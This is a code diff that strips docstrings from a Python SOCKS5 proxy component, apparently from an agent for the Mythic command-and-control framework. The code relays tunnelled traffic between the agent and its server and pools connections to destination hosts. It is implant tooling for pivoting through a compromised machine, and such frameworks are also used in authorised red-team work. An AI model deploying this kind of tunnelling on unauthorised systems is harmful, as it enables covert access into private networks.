@@ -43,7 +43,6 @@
                 connection_stats[stat_name] += value
         
         def get_pooled_connection(host, port):
-            """Get a connection from the pool or create a new one"""
             with pool_lock:
                 key = f"{host}:{port}"
                 if key in connection_pool and connection_pool[key]:
@@ -62,7 +61,6 @@
                 return None
         
         def return_pooled_connection(host, port, sock):
-            """Return a connection to the pool"""
             with pool_lock:
                 key = f"{host}:{port}"
                 if len(connection_pool[key]) < MAX_CONNECTIONS_PER_HOST:
@@ -77,7 +75,6 @@
                     return False
         
         def sendSocksPacket(server_id, data, exit_value, priority=False):
-            """Enhanced packet sending with priority support"""
             packet = {
                 "server_id": server_id,
                 "data": base64.b64encode(data).decode() if data else "",
@@ -94,7 +91,6 @@
                 self.socks_out.put(packet)
         
         def create_socket():
-            """Enhanced socket creation with better error handling"""
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(TIMEOUT_SOCKET)
@@ -105,7 +101,6 @@
                 return f"Failed to create socket: {str(err)}"
         
         def connect_to_dst(dst_addr, dst_port):
-            """Enhanced connection with pooling and better error handling"""
             sock = get_pooled_connection(dst_addr, dst_port)
             if sock:
                 return sock
@@ -137,7 +132,6 @@
                 return 0
         
         def request_client(msg):
-            """Enhanced SOCKS5 request parsing with IPv6 support"""
             try:
                 message = base64.b64decode(msg["data"])
                 s5_request = message[:BUFSIZE]
@@ -180,7 +174,6 @@
                 return False
         
         def create_connection(msg):
-            """Enhanced connection creation with better error handling"""
             dst = request_client(msg)
             rep = b'\x07'  
             bnd = b'\x00' * 6 
@@ -216,12 +209,10 @@
             return None
         
         def get_running_socks_thread():
-            """Get currently running SOCKS threads"""
             return [t for t in threading.enumerate() 
                    if "socks:" in t.name and task_id not in t.name]
         
         def a2m(server_id, socket_dst):
-            """Agent to Mythic - Enhanced with batching and better error handling"""
             buffer = b""
             last_activity = time.time()
             
@@ -279,7 +270,6 @@
             update_stats('active_connections', -1)
         
         def m2a(server_id, socket_dst):
-            """Mythic to Agent - Enhanced with batching"""
             while True:
                 if task_id not in [task["task_id"] for task in self.taskings]:
                     break
@@ -316,7 +306,6 @@
                 pass
         
         def cleanup_stale_connections():
-            """Clean up stale connections in the pool"""
             with pool_lock:
                 current_time = time.time()
                 for host_port, connections in list(connection_pool.items()):
